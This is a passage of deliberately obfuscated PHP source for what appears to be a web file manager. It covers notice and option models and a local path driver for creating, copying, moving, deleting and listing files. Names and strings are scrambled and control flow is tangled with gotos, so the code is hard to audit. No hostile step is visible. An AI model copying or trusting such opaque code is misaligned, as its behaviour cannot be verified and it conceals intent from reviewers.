$AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[28]] = isset($D…¶³Öí‚¿[$eˆ¯Ã©­…][$fÁ‰¡•ÜÀ»[28]]) ? $D…¶³Öí‚¿[$eˆ¯Ã©­…][$fÁ‰¡•ÜÀ»[28]] : LNG($fÁ‰¡•ÜÀ»[1854]); goto CìÅİùí‹×; fè‚“ÍÀ³Ã: if (strpos($bÂøÜôä¶â, $fÁ‰¡•ÜÀ»[1686]) === 0 || isset($F†ª£¯î [$fÁ‰¡•ÜÀ»[1685]])) { goto bßğ–ÖÛãì; eÃÆ²Ù¾İ±: if ($F†ª£¯î [$fÁ‰¡•ÜÀ»[29]] == $fÁ‰¡•ÜÀ»[1689]) { $F†ª£¯î [$fÁ‰¡•ÜÀ»[1560]][$fÁ‰¡•ÜÀ»[365]] = $Eí£•›¨²Ç[$F†ª£¯î [$fÁ‰¡•ÜÀ»[1560]][$fÁ‰¡•ÜÀ»[365]]]; } if ($F†ª£¯î [$fÁ‰¡•ÜÀ»[29]] == $fÁ‰¡•ÜÀ»[359]) { $F†ª£¯î [$fÁ‰¡•ÜÀ»[1696]] = $F†ª£¯î [$fÁ‰¡•ÜÀ»[1618]]; $F†ª£¯î [$fÁ‰¡•ÜÀ»[1685]] = $F†ª£¯î [$fÁ‰¡•ÜÀ»[1696]][$fÁ‰¡•ÜÀ»[365]]; $F†ª£¯î [$fÁ‰¡•ÜÀ»[1618]] = !1; $F†ª£¯î [$fÁ‰¡•ÜÀ»[365]] = $fÁ‰¡•ÜÀ»[33]; } if ($F†ª£¯î [$fÁ‰¡•ÜÀ»[1618]] && $F†ª£¯î [$fÁ‰¡•ÜÀ»[1618]][$fÁ‰¡•ÜÀ»[384]] == $fÁ‰¡•ÜÀ»[799]) { unset($f¼çÌâšÔñ[$cŒÅÏŒ†Ú]); continue; } goto AÈÊÒ¾ƒò; AÈÊÒ¾ƒò: if ($F†ª£¯î [$fÁ‰¡•ÜÀ»[1696]] && $F†ª£¯î [$fÁ‰¡•ÜÀ»[1696]][$fÁ‰¡•ÜÀ»[384]] == $fÁ‰¡•ÜÀ»[799]) { unset($f¼çÌâšÔñ[$cŒÅÏŒ†Ú]); continue; } goto f¼¸É™¢áİ; bßğ–ÖÛãì: $F†ª£¯î [$fÁ‰¡•ÜÀ»[1618]] = $Eí£•›¨²Ç[$F†ª£¯î [$fÁ‰¡•ÜÀ»[365]]]; $F†ª£¯î [$fÁ‰¡•ÜÀ»[1696]] = $Eí£•›¨²Ç[$F†ª£¯î [$fÁ‰¡•ÜÀ»[1685]]]; if ($F†ª£¯î [$fÁ‰¡•ÜÀ»[29]] == $fÁ‰¡•ÜÀ»[729]) { $F†ª£¯î [$fÁ‰¡•ÜÀ»[1560]][$fÁ‰¡•ÜÀ»[735]] = $Eí£•›¨²Ç[$F†ª£¯î [$fÁ‰¡•ÜÀ»[1560]][$fÁ‰¡•ÜÀ»[735]]]; $F†ª£¯î [$fÁ‰¡•ÜÀ»[1560]][$fÁ‰¡•ÜÀ»[736]] = $Eí£•›¨²Ç[$F†ª£¯î [$fÁ‰¡•ÜÀ»[1560]][$fÁ‰¡•ÜÀ»[736]]]; } goto eÃÆ²Ù¾İ±; f¼¸É™¢áİ: } $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[1560]] = $F†ª£¯î ; $C©ÊªÛç±[] = $AèÚ‹ï´©; goto e¾†«ì»°¤; CìÅİùí‹×: $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[1729]] = isset($D…¶³Öí‚¿[$eˆ¯Ã©­…][$fÁ‰¡•ÜÀ»[1729]]) ? $D…¶³Öí‚¿[$eˆ¯Ã©­…][$fÁ‰¡•ÜÀ»[1729]] : $fÁ‰¡•ÜÀ»[33]; $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[968]] = isset($FÔ£–¬™Ú[$bÂøÜôä¶â]) ? $FÔ£–¬™Ú[$bÂøÜôä¶â] : (strpos($bÂøÜôä¶â, $fÁ‰¡•ÜÀ»[1857]) == 0 ? LNG($fÁ‰¡•ÜÀ»[1858]) : LNG($fÁ‰¡•ÜÀ»[1854])); $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[1655]] = isset($D…¶³Öí‚¿[$eˆ¯Ã©­…]) ? $D…¶³Öí‚¿[$eˆ¯Ã©­…] : !1; goto aØï‚×; e¾†«ì»°¤: } return $C©ÊªÛç±; goto dº¥¿ˆº©Œ; dº¥¿ˆº©Œ: } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\156\x6f\164\151\x63\145\114\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\143\157\156\164\x65\156\164", "\x61\165\x74\x68", "\x6d\157\x64\x65", "\164\151\x6d\x65", "\x74\x79\160\145", "\x73\x6f\162\x74"); public function listData($Fò¯à¯£À = false, $FèÖïİİ•Ü = "\163\157\162\164", $E×¨›ùÔ  = false) { return parent::listData($Fò¯à¯£À, $FèÖïİİ•Ü, $E×¨›ùÔ ); } public function add($C‘¦„‹“¸å) { goto FÌÃêÕø˜¾; FÌÃêÕø˜¾: $aèöÏÇÛ =& $_SERVER[ÍÓÖ€°å]; $f»®Üéö÷„ = $this->findByName($C‘¦„‹“¸å[$aèöÏÇÛ[28]]); if ($f»®Üéö÷„) { return !1; } goto Fë±©ÃÙ‚Ò; Fë±©ÃÙ‚Ò: $eŒÜÁ„‘ñ = time(); if ($C‘¦„‹“¸å[$aèöÏÇÛ[12]] == $aèöÏÇÛ[1859]) { $eŒÜÁ„‘ñ = strtotime($C‘¦„‹“¸å[$aèöÏÇÛ[178]]); } $C‘¦„‹“¸å[$aèöÏÇÛ[178]] = $eŒÜÁ„‘ñ; goto FÛÁ‘àŠ˜î; FÛÁ‘àŠ˜î: return parent::insert($C‘¦„‹“¸å); goto F«îêÔÀš°; F«îêÔÀš°: } public function update($E—ÎæÉ„®‘, $FÇÌîŞÛ) { goto dŠ›§²òŞ¶; dŠ›§²òŞ¶: $e¼½í„×° =& $_SERVER[ÍÓÖ€°å]; $Eƒ«ñ£«Úğ = $this->listData($E—ÎæÉ„®‘); $FÒê˜ïŒå = $this->findByName($FÇÌîŞÛ[$e¼½í„×°[28]]); goto dªÎ—±ƒˆ¡; dªÎ—±ƒˆ¡: if (!$Eƒ«ñ£«Úğ || $FÒê˜ïŒå && $FÒê˜ïŒå[$e¼½í„×°[357]] != $Eƒ«ñ£«Úğ[$e¼½í„×°[357]]) { return !1; } $EÒŠà¹æĞ = time(); if ($FÇÌîŞÛ[$e¼½í„×°[12]] == $e¼½í„×°[1859]) { $EÒŠà¹æĞ = strtotime($FÇÌîŞÛ[$e¼½í„×°[178]]); } goto A×•Åæ«³²; A×•Åæ«³²: $FÇÌîŞÛ[$e¼½í„×°[178]] = $EÒŠà¹æĞ; return parent::update($E—ÎæÉ„®‘, $FÇÌîŞÛ); goto A„ó…¯¾ñ°; A„ó…¯¾ñ°: } public function remove($a¦»óå‘„¯) { $A¥Ôì…ã = $this->listData($a¦»óå‘„¯); if (!$A¥Ôì…ã || $A¥Ôì…ã[$_SERVER[ÍÓÖ€°å][799]]) { return !1; } return parent::remove($a¦»óå‘„¯); } public function sort($A¯â¨¨óÅ, $a²¼ŒÊğÌ¦) { return parent::update($A¯â¨¨óÅ, $a²¼ŒÊğÌ¦); } private function initUserOption() { $B”ª¢†¸Å¥ =& $_SERVER[ÍÓÖ€°å]; $this->optionType = $B”ª¢†¸Å¥[1860]; $this->modelType = $B”ª¢†¸Å¥[1861]; $this->field = array($B”ª¢†¸Å¥[1862], $B”ª¢†¸Å¥[28], $B”ª¢†¸Å¥[178], $B”ª¢†¸Å¥[29], $B”ª¢†¸Å¥[437], $B”ª¢†¸Å¥[171]); } public function userNoticeGet($c±¯µÅŠÆÄ = false) { $this->initUserOption(); return parent::listData($c±¯µÅŠÆÄ, $_SERVER[ÍÓÖ€°å][357], !0); } public function userNoticeAdd($e¼îÜ…) { $Eâ†‡×òÕ¹ =& $_SERVER[ÍÓÖ€°å]; $this->initUserOption(); $c‡ÖÛÒ‘ = $this->findByKey($Eâ†‡×òÕ¹[1862], $e¼îÜ…[$Eâ†‡×òÕ¹[357]]); if ($c‡ÖÛÒ‘) { return !0; } $b‘ƒ» £Ÿ† = array($Eâ†‡×òÕ¹[1862] => $e¼îÜ…[$Eâ†‡×òÕ¹[357]], $Eâ†‡×òÕ¹[28] => $e¼îÜ…[$Eâ†‡×òÕ¹[28]], $Eâ†‡×òÕ¹[178] => $e¼îÜ…[$Eâ†‡×òÕ¹[178]], $Eâ†‡×òÕ¹[29] => isset($e¼îÜ…[$Eâ†‡×òÕ¹[29]]) ? $e¼îÜ…[$Eâ†‡×òÕ¹[29]] : 1, $Eâ†‡×òÕ¹[437] => 0, $Eâ†‡×òÕ¹[171] => 0); return parent::insert($b‘ƒ» £Ÿ†); } public function userNoticeEdit($BÅè˜ÕëôØ, $bñ‰å„º‘Ğ) { $this->initUserOption(); return parent::update($BÅè˜ÕëôØ, $bñ‰å„º‘Ğ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\x6d\137\157\x70\x74\151\x6f\156"; protected $jsonField = array("\x6d\x65\156\165", "\162\x6f\154\145", "\x72\157\x6c\x65\107\162\157\165\x70", "\x72\x65\x67\151\163\164", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($CÂÚô¯ÖÇÁ) { return "\x53\x79\163\x74\145\155\x4f\160\164\151\157\156\x5f{$CÂÚô¯ÖÇÁ}"; } } goto bİÉµÜí†¬; C¡«Ì‘œ›‹: define($_SERVER[ÍÓÖ€°å][219], 2); define($_SERVER[ÍÓÖ€°å][220], 3); define($_SERVER[ÍÓÖ€°å][221], 1); goto dğ¨½²ƒùİ; cìªİƒïª‡: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($B¿œ¢öÉá) { if (substr($B¿œ¢öÉá, 0, 2) == $_SERVER[ÍÓÖ€°å][855]) { $B¿œ¢öÉá = BASIC_PATH . substr($B¿œ¢öÉá, 2); } return $B¿œ¢öÉá; } public function iconvApp($B”›ìá ï±) { $eËÓ½À¢ò =& $_SERVER[ÍÓÖ€°å]; global $config; return $this->iconvTo($B”›ìá ï±, $config[$eËÓ½À¢ò[853]], $config[$eËÓ½À¢ò[852]]); } public function iconvSystem($Aê‡¸©áƒ) { $C»º¤«š÷Á =& $_SERVER[ÍÓÖ€°å]; global $config; return $this->iconvTo($Aê‡¸©áƒ, $config[$C»º¤«š÷Á[852]], $config[$C»º¤«š÷Á[853]]); } public function getPathOuter($A„½–‰©º) { goto bŒóÓÄ¥Å; FŠƒ¥Á„è‰: $A„½–‰©º = KodIO::clear($A„½–‰©º); $A„½–‰©º = substr($A„½–‰©º, strlen($a¥²‘ô„ìÒ)); if (empty($this->pathDriver)) { return $A„½–‰©º; } goto F²§Óã¶î¡; BÃöáöÑ‚: if (substr($a¥²‘ô„ìÒ, 0, 2) == $aÑèŠÎòè„[855]) { $a¥²‘ô„ìÒ = BASIC_PATH . substr($a¥²‘ô„ìÒ, 2); } if (substr($A„½–‰©º, 0, 2) == $aÑèŠÎòè„[855]) { $A„½–‰©º = BASIC_PATH . substr($A„½–‰©º, 2); } $a¥²‘ô„ìÒ = KodIO::clear($a¥²‘ô„ìÒ); goto FŠƒ¥Á„è‰; F²§Óã¶î¡: return $this->pathDriver . $aÑèŠÎòè„[8] . ltrim($A„½–‰©º, $aÑèŠÎòè„[8]); goto f‡Ïğµˆ³Ô; bŒóÓÄ¥Å: $aÑèŠÎòè„ =& $_SERVER[ÍÓÖ€°å]; $a¥²‘ô„ìÒ = $this->iconvApp($this->pathBase); $A„½–‰©º = $this->iconvApp($A„½–‰©º); goto BÃöáöÑ‚; f‡Ïğµˆ³Ô: } public function mkfile($DŠ¸œ¿İ, $E½¶¾ã®Ö… = '', $aÒ„—Ò§ = REPEAT_RENAME) { $DŠ¸œ¿İ = $this->iconvSystem($DŠ¸œ¿İ); @touch($DŠ¸œ¿İ); if ($E½¶¾ã®Ö…) { file_put_contents($DŠ¸œ¿İ, $E½¶¾ã®Ö…); } return is_file($DŠ¸œ¿İ) ? $this->getPathOuter($DŠ¸œ¿İ) : !1; } public function mkdir($C‡©Êí×Î”, $FÍ‰ÂôöËˆ = REPEAT_SKIP) { $C‡©Êí×Î” = $this->iconvSystem($C‡©Êí×Î”); if (is_dir($C‡©Êí×Î”)) { return $this->getPathOuter($C‡©Êí×Î”); } @mkdir($C‡©Êí×Î”, 511, !0); return is_dir($C‡©Êí×Î”) ? $this->getPathOuter($C‡©Êí×Î”) : !1; } public function copyFile($a±õàí ¦õ, $A™ö“´øÕ) { $this->mkdir($this->pathFather($A™ö“´øÕ)); $a±õàí ¦õ = $this->iconvSystem($a±õàí ¦õ); $A™ö“´øÕ = $this->iconvSystem($A™ö“´øÕ); $eÄ›ªº¬½Í = @copy($a±õàí ¦õ, $A™ö“´øÕ); return $eÄ›ªº¬½Í ? $this->getPathOuter($A™ö“´øÕ) : !1; } public function moveFile($Eğ×½¬­, $Eòñö¿©ô) { $this->mkdir($this->pathFather($Eòñö¿©ô)); $Eğ×½¬­ = $this->iconvSystem($Eğ×½¬­); $Eòñö¿©ô = $this->iconvSystem($Eòñö¿©ô); $D—ÜîÚµ¹À = intval(@rename($Eğ×½¬­, $Eòñö¿©ô)); if (!$D—ÜîÚµ¹À) { if ($D—ÜîÚµ¹À = intval(@copy($Eğ×½¬­, $Eòñö¿©ô))) { @unlink($Eğ×½¬­); } } return $D—ÜîÚµ¹À ? $this->getPathOuter($Eòñö¿©ô) : !1; } public function delFile($Eù¼æÕŒ®¢) { $Eù¼æÕŒ®¢ = $this->iconvSystem($Eù¼æÕŒ®¢); if (!@unlink($Eù¼æÕŒ®¢)) { @chmod($Eù¼æÕŒ®¢, 511); if (!@unlink($Eù¼æÕŒ®¢)) { return !1; } } else { return !0; } } public function delFolder($dÙ´Ãàˆïä) { goto F¬›†ÁáÊ; F¬›†ÁáÊ: $AÓ‘¡¥‚‘ =& $_SERVER[ÍÓÖ€°å]; $dÙ´Ãàˆïä = $this->iconvSystem($dÙ´Ãàˆïä); if (!is_dir($dÙ´Ãàˆïä)) { return !0; } goto BŠó„ŞÀ‘è; BŠó„ŞÀ‘è: if (!($C‰½¡ØéŒÜ = opendir($dÙ´Ãàˆïä))) { return !1; } while (($DõòŠŞÑ• = readdir($C‰½¡ØéŒÜ)) !== !1) { if ($DõòŠŞÑ• == $AÓ‘¡¥‚‘[90] || $DõòŠŞÑ• == $AÓ‘¡¥‚‘[865]) { continue; } $BÆÔÚÁà¬À = $dÙ´Ãàˆïä . $AÓ‘¡¥‚‘[8] . $DõòŠŞÑ•; if (!is_dir($BÆÔÚÁà¬À)) { if (!unlink($BÆÔÚÁà¬À)) { chmod($BÆÔÚÁà¬À, 511); if (!unlink($BÆÔÚÁà¬À)) { return !1; } } } else { chmod($BÆÔÚÁà¬À, 511); $BÆÔÚÁà¬À = $this->iconvApp($BÆÔÚÁà¬À); if (!$this->delFolder($BÆÔÚÁà¬À)) { return !1; } } } closedir($C‰½¡ØéŒÜ); goto a«éé®â¼; a«éé®â¼: return rmdir($dÙ´Ãàˆïä); goto bñÄƒê”; bñÄƒê”: } public function rename($cÅó¥—‚¢¥, $c‡á…ßÔÓ›) { goto BØÊëÑˆ¯—; CÜªÄÎ¬Å: $cÅó¥—‚¢¥ = $this->iconvSystem($cÅó¥—‚¢¥); $cîŞÑàœÁ™ = $this->pathFather($cÅó¥—‚¢¥); $FŠ´èâ°Îœ = rtrim($cîŞÑàœÁ™, $E»•†Š«Ïõ[8]) . $E»•†Š«Ïõ[8] . $D‡±Öªî; goto FÂÃ‹†æÙ×; FÂÃ‹†æÙ×: $BìåŸÚ‹ª† = @rename($cÅó¥—‚¢¥, $FŠ´èâ°Îœ); $FŠ´èâ°Îœ = $this->iconvApp($FŠ´èâ°Îœ); return $BìåŸÚ‹ª† ? $this->getPathOuter($FŠ´èâ°Îœ) : !1; goto eïã’¢‡•Ö; BØÊëÑˆ¯—: $E»•†Š«Ïõ =& $_SERVER[ÍÓÖ€°å]; $D‡±Öªî = $this->fileNameAuto($this->pathFather($cÅó¥—‚¢¥), $c‡á…ßÔÓ›); $D‡±Öªî = $this->iconvSystem($D‡±Öªî); goto CÜªÄÎ¬Å; eïã’¢‡•Ö: } public function size($FÜÅÁİç£²) { $FÜÅÁİç£² = $this->iconvSystem($FÜÅÁİç£²); return (double) abs(sprintf($_SERVER[ÍÓÖ€°å][866], @filesize($FÜÅÁİç£²))); } public function info($b¶Œ¼Ö¬‡‚) { $b¶Œ¼Ö¬‡‚ = $this->iconvSystem($b¶Œ¼Ö¬‡‚); if ($this->isFolder($b¶Œ¼Ö¬‡‚)) { return $this->folderInfo($b¶Œ¼Ö¬‡‚, !0); } else { if ($this->isFile($b¶Œ¼Ö¬‡‚)) { return $this->fileInfo($b¶Œ¼Ö¬‡‚); } } return !1; } protected function infoChildren($B¯×ã¸Ñù, &$FƒÌ„‚áÌ) { $f‡ÖÈ…Ùªˆ =& $_SERVER[ÍÓÖ€°å]; $B¯×ã¸Ñù = rtrim($B¯×ã¸Ñù, $f‡ÖÈ…Ùªˆ[8]) . $f‡ÖÈ…Ùªˆ[8]; $B¯×ã¸Ñù = $this->iconvSystem($B¯×ã¸Ñù); if (!($D–ŠÃÙäƒ‰ = @opendir($B¯×ã¸Ñù))) { return; } while (($f¿®•÷«…² = readdir($D–ŠÃÙäƒ‰)) !== !1) { if ($f¿®•÷«…² == $f‡ÖÈ…Ùªˆ[90] || $f¿®•÷«…² == $f‡ÖÈ…Ùªˆ[865]) { continue; } $e‰©°ÊºÈ = $B¯×ã¸Ñù . $f¿®•÷«…²; $AàèŞÜ§¡© = $this->iconvApp($e‰©°ÊºÈ); if (is_file($e‰©°ÊºÈ)) { $FƒÌ„‚áÌ[$f‡ÖÈ…Ùªˆ[79]]++; $FƒÌ„‚áÌ[$f‡ÖÈ…Ùªˆ[78]] += $this->size($AàèŞÜ§¡©); } else { $FƒÌ„‚áÌ[$f‡ÖÈ…Ùªˆ[80]]++; $this->infoChildren($AàèŞÜ§¡©, $FƒÌ„‚áÌ); } } closedir($D–ŠÃÙäƒ‰); } private function folderInfo($fİ¼è„éßŞ, $DÆº…ğ§™» = false, $D¶Çë‹‘ê = false) { goto cÑÏÂ¢á»¤; cÑÏÂ¢á»¤: $Aó¢ß™˜¿á =& $_SERVER[ÍÓÖ€°å]; $fİ¼è„éßŞ = rtrim($fİ¼è„éßŞ, $Aó¢ß™˜¿á[8]) . $Aó¢ß™˜¿á[8]; $bôê®Ë¿­— = $this->iconvApp($this->pathThis($fİ¼è„éßŞ)); goto fÍ„ÇÄï”; fÍ„ÇÄï”: if ($D¶Çë‹‘ê) { return array($Aó¢ß™˜¿á[28] => $bôê®Ë¿­—, $Aó¢ß™˜¿á[76] => $this->getPathOuter($fİ¼è„éßŞ), $Aó¢ß™˜¿á[29] => $Aó¢ß™˜¿á[77]); } $e¤¨èÃæ = array($Aó¢ß™˜¿á[28] => $bôê®Ë¿­—, $Aó¢ß™˜¿á[76] => $this->getPathOuter($fİ¼è„éßŞ), $Aó¢ß™˜¿á[29] => $Aó¢ß™˜¿á[77], $Aó¢ß™˜¿á[175] => @filectime($fİ¼è„éßŞ), $Aó¢ß™˜¿á[101] => @filemtime($fİ¼è„éßŞ), $Aó¢ß™˜¿á[863] => is_readable($fİ¼è„éßŞ), $Aó¢ß™˜¿á[864] => is_writable($fİ¼è„éßŞ), $Aó¢ß™˜¿á[867] => get_mode($fİ¼è„éßŞ)); if ($DÆº…ğ§™») { $e¤¨èÃæ[$Aó¢ß™˜¿á[179]] = $this->has($fİ¼è„éßŞ, !1); $e¤¨èÃæ[$Aó¢ß™˜¿á[180]] = $this->has($fİ¼è„éßŞ, !0); } goto fÛíõƒ˜·Ú; fÛíõƒ˜·Ú: return $e¤¨èÃæ; goto f„·÷Êˆ­ô; f„·÷Êˆ­ô: } private function fileInfo($c”ÑÍôòÁ, $Dàˆ¯×ÁÀ’ = false) { $cß°°‚™ =& $_SERVER[ÍÓÖ€°å]; $Fî„•ÍÀæ¥ = $this->iconvApp($this->pathThis($c”ÑÍôòÁ)); if ($Dàˆ¯×ÁÀ’) { return array($cß°°‚™[28] => $Fî„•ÍÀæ¥, $cß°°‚™[76] => $this->getPathOuter($c”ÑÍôòÁ), $cß°°‚™[29] => $cß°°‚™[155], $cß°°‚™[78] => $this->size($c”ÑÍôòÁ), $cß°°‚™[148] => $this->ext($Fî„•ÍÀæ¥)); } $F¡Œİ­öŒ± = array($cß°°‚™[28] => $Fî„•ÍÀæ¥, $cß°°‚™[76] => $this->getPathOuter($c”ÑÍôòÁ), $cß°°‚™[29] => $cß°°‚™[155], $cß°°‚™[175] => @filectime($c”ÑÍôòÁ), $cß°°‚™[101] => @filemtime($c”ÑÍôòÁ), $cß°°‚™[78] => $this->size($c”ÑÍôòÁ), $cß°°‚™[148] => $this->ext($Fî„•ÍÀæ¥), $cß°°‚™[863] => is_readable($c”ÑÍôòÁ), $cß°°‚™[864] => is_writable($c”ÑÍôòÁ), $cß°°‚™[867] => get_mode($c”ÑÍôòÁ)); $this->fileInfoImage($c”ÑÍôòÁ, $F¡Œİ­öŒ±); return $F¡Œİ­öŒ±; } public function exist($b¼‰··Û£—) { $b¼‰··Û£— = $this->iconvSystem($b¼‰··Û£—); return @file_exists($b¼‰··Û£—); } public function isFile($f°ºÁ¦¦‰¶) { $f°ºÁ¦¦‰¶ = $this->iconvSystem($f°ºÁ¦¦‰¶); return @is_file($f°ºÁ¦¦‰¶); } public function isFolder($Cµ‘á¹¼ó) { $Cµ‘á¹¼ó = $this->iconvSystem($Cµ‘á¹¼ó); return @is_dir($Cµ‘á¹¼ó); } private function fileInfoImage($BÈìµ‚‘éŠ, &$E™·¾é‰¶¢) { $F·“İÕ†ôï =& $_SERVER[ÍÓÖ€°å]; $C×ÊœéòÔ» = array($F·“İÕ†ôï[196], $F·“İÕ†ôï[149], $F·“İÕ†ôï[197], $F·“İÕ†ôï[198], $F·“İÕ†ôï[199]); if (in_array($E™·¾é‰¶¢[$F·“İÕ†ôï[148]], $C×ÊœéòÔ»)) { $A¥¾À¹•Æ = GetImageSize($BÈìµ‚‘éŠ); if ($A¥¾À¹•Æ) { $E™·¾é‰¶¢[$F·“İÕ†ôï[200]] = array($F·“İÕ†ôï[201] => $A¥¾À¹•Æ[0], $F·“İÕ†ôï[868] => $A¥¾À¹•Æ[1]); } } } public function listPath($Cà¦Àâ‰¥Ü, $déšºõùÚ = true, $a‚É™ô‚ï = false) { goto aĞƒ‰Î¸»Ê; e¡¨©˜´É•: closedir($f›â¡ÊöÀ); return $B®—å§“; goto E¦Ìï‰Âô; aĞƒ‰Î¸»Ê: $FÆ»ŒÕÔ£ =& $_SERVER[ÍÓÖ€°å]; $Cà¦Àâ‰¥Ü = $this->iconvSystem($Cà¦Àâ‰¥Ü); $Cà¦Àâ‰¥Ü = rtrim($Cà¦Àâ‰¥Ü, $FÆ»ŒÕÔ£[8]) . $FÆ»ŒÕÔ£[8]; goto Aî„¦¬Ã; Aî„¦¬Ã: $B®—å§“ = array($FÆ»ŒÕÔ£[75] => array(), $FÆ»ŒÕÔ£[74] => array()); if (!($f›â¡ÊöÀ = @opendir($Cà¦Àâ‰¥Ü))) { return $B®—å§“; } while (($Aå¸ù‹ğ³ = readdir($f›â¡ÊöÀ)) !== !1) { if ($Aå¸ù‹ğ³ == $FÆ»ŒÕÔ£[90] || $Aå¸ù‹ğ³ == $FÆ»ŒÕÔ£[865]) { continue; } $Aİ‰œÌğÒà = $Cà¦Àâ‰¥Ü . $Aå¸ù‹ğ³; if (is_file($Aİ‰œÌğÒà)) { $B®—å§“[$FÆ»ŒÕÔ£[74]][] = $this->fileInfo($Aİ‰œÌğÒà, $a‚É™ô‚ï); } else { $B®—å§“[$FÆ»ŒÕÔ£[75]][] = $this->folderInfo($Aİ‰œÌğÒà, $déšºõùÚ, $a‚É™ô‚ï); } } goto e¡¨©˜´É•; E¦Ìï‰Âô: } public function listAll($Aî¯¬’½, &$E·‡óÉß¿‡ = array()) { goto cä‚ÓİÓ†ä; cä‚ÓİÓ†ä: $f¥£ÃÖ¡½Ç =& $_SERVER[ÍÓÖ€°å]; $Aî¯¬’½ = $this->iconvSystem($Aî¯¬’½); $Aî¯¬’½ = rtrim($Aî¯¬’½, $f¥£ÃÖ¡½Ç[8]) . $f¥£ÃÖ¡½Ç[8]; goto bçš„Ê¼ğ“; bçš„Ê¼ğ“: if (!($C‚İóèëé¼ = @opendir($Aî¯¬’½))) { return $E·‡óÉß¿‡; } while (($bÍ¨‰’£‡• = readdir($C‚İóèëé¼)) !== !1) { if ($bÍ¨‰’£‡• == $f¥£ÃÖ¡½Ç[90] || $bÍ¨‰’£‡• == $f¥£ÃÖ¡½Ç[865]) { continue; } $bî¿„¦ÂñÉ = $Aî¯¬’½ . $bÍ¨‰’£‡•; if (is_dir($bî¿„¦ÂñÉ)) { $E·‡óÉß¿‡[] = array($f¥£ÃÖ¡½Ç[76] => $bî¿„¦ÂñÉ . $f¥£ÃÖ¡½Ç[8], $f¥£ÃÖ¡½Ç[77] => 1, $f¥£ÃÖ¡½Ç[78] => 0); $this->listAll($bî¿„¦ÂñÉ, $E·‡óÉß¿‡); } else { $E·‡óÉß¿‡[] = array($f¥£ÃÖ¡½Ç[76] => $bî¿„¦ÂñÉ, $f¥£ÃÖ¡½Ç[77] => 0, $f¥£ÃÖ¡½Ç[78] => $this->size($bî¿„¦ÂñÉ)); } } closedir($C‚İóèëé¼); goto AÇ·—•ƒ´Ÿ; AÇ·—•ƒ´Ÿ: return $E·‡óÉß¿‡; goto aĞ³‚ŒŠ“ğ; aĞ³‚ŒŠ“ğ: } public function has($F…¿•ë”¶–, $aÕãÚÏ¦ï… = true) { goto BŠùˆ±”æ; B‰¬ñ§¯‡¥: if (!($BñÍ¸ñ¦ˆ’ = @opendir($F…¿•ë”¶–))) { return !1; } while (($e÷îòôõ›Ó = readdir($BñÍ¸ñ¦ˆ’)) !== !1) { if ($e÷îòôõ›Ó == $fñ¯ÍŠ…¦[90] || $e÷îòôõ›Ó == $fñ¯ÍŠ…¦[865]) { continue; } $bÚ®¯’Şç— = $F…¿•ë”¶– . $e÷îòôõ›Ó; if ($aÕãÚÏ¦ï…) { if (@is_file($bÚ®¯’Şç—)) { return !0; } } else { if (@is_dir($bÚ®¯’Şç— . $fñ¯ÍŠ…¦[8])) { return !0; } } } closedir($BñÍ¸ñ¦ˆ’); goto d´÷éÀ‡¨; BŠùˆ±”æ: $fñ¯ÍŠ…¦ =& $_SERVER[ÍÓÖ€°å]; $F…¿•ë”¶– = $this->iconvSystem($F…¿•ë”¶–); $F…¿•ë”¶– = rtrim($F…¿•ë”¶–, $fñ¯ÍŠ…¦[8]) . $fñ¯ÍŠ…¦[8]; goto B‰¬ñ§¯‡¥; d´÷éÀ‡¨: return !1; goto CÊñÙ•ŠÈÖ; CÊñÙ•ŠÈÖ: } public function hashSimple($eéàñÃø‹) { goto Aá©¸‹Øø; E“Ÿ ’Ø†: if ($Bê„ÚÀ‚¹ <= $f²äï‰¹„ô * $eÍ‡·¶øÒÕ) { return $this->hashMd5($eéàñÃø‹) . $Bê„ÚÀ‚¹; } $E„ğˆ´—Å† = $e±Ú‹³Õ‚§[33]; $e­øÕ­ÜÔ = intval($Bê„ÚÀ‚¹ / $eÍ‡·¶øÒÕ); goto BŞóè¾à©ò; BŞóè¾à©ò: $d˜ƒùÛ±Ïø = fopen($eéàñÃø‹, $e±Ú‹³Õ‚§[869]); if (!$d˜ƒùÛ±Ïø) { return $E„ğˆ´—Å†; } for ($FªŒÒˆÔ×  = 0; $FªŒÒˆÔ×  < $eÍ‡·¶øÒÕ; $FªŒÒˆÔ× ++) { fseek($d˜ƒùÛ±Ïø, $e­øÕ­ÜÔ * $FªŒÒˆÔ× ); $E„ğˆ´—Å† .= fread($d˜ƒùÛ±Ïø, $f²äï‰¹„ô); } goto e÷¦¦²Ñª; A©‡Š¦‰§: $Bê„ÚÀ‚¹ = $this->size($eéàñÃø‹); $f²äï‰¹„ô = 200; $eÍ‡·¶øÒÕ = 50; goto E“Ÿ ’Ø†; Aá©¸‹Øø: $e±Ú‹³Õ‚§ =& $_SERVER[ÍÓÖ€°å]; if (!$eéàñÃø‹) { return md5($e±Ú‹³Õ‚§[33]); } $eéàñÃø‹ = $this->iconvSystem($eéàñÃø‹); goto A©‡Š¦‰§; D°·Ÿ›‚­Û: return md5($E„ğˆ´—Å†) . $Bê„ÚÀ‚¹; goto d®Â×éÉä—; e÷¦¦²Ñª: fseek($d˜ƒùÛ±Ïø, $Bê„ÚÀ‚¹ - $f²äï‰¹„ô); $E„ğˆ´—Å† .= fread($d˜ƒùÛ±Ïø, $f²äï‰¹„ô); fclose($d˜ƒùÛ±Ïø); goto D°·Ÿ›‚­Û; d®Â×éÉä—: } public function getContent($EØ™ÉƒéŞÍ) { $EØ™ÉƒéŞÍ = $this->iconvSystem($EØ™ÉƒéŞÍ); return file_get_contents($EØ™ÉƒéŞÍ); } public function setContent($C–¬¾¹ôˆ, $Fœòéù‚âß = '') { $C–¬¾¹ôˆ = $this->iconvSystem($C–¬¾¹ôˆ); return file_put_contents($C–¬¾¹ôˆ, $Fœòéù‚âß, LOCK_EX); } public function fileSubstr($d‘½—áæ, $aÚÄ©Ããòõ = 0, $eî¥·˜¼ùß = false) { goto FŒ§ô…›êê; FŒ§ô…›êê: $F³œÙ”š‰Â =& $_SERVER[ÍÓÖ€°å]; $d‘½—áæ = 